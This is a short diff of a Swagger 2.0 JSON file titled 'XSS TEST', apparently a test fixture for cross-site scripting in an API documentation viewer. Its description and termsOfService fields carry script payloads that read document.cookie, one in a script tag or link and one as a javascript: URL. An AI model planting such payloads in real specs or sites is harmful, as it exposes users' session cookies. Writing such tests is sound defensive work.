@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "XSS TEST",
-  "description": "</p><script> with(document){alert(cookie);}</script><p>",
+  "description": "</p><a href=with(document){alert(cookie);}>link test 3 </a><p>",
   "termsOfService": "javascript:alert(document.cookie)"},
   "contact": 
   {"name": "AHNLAB",
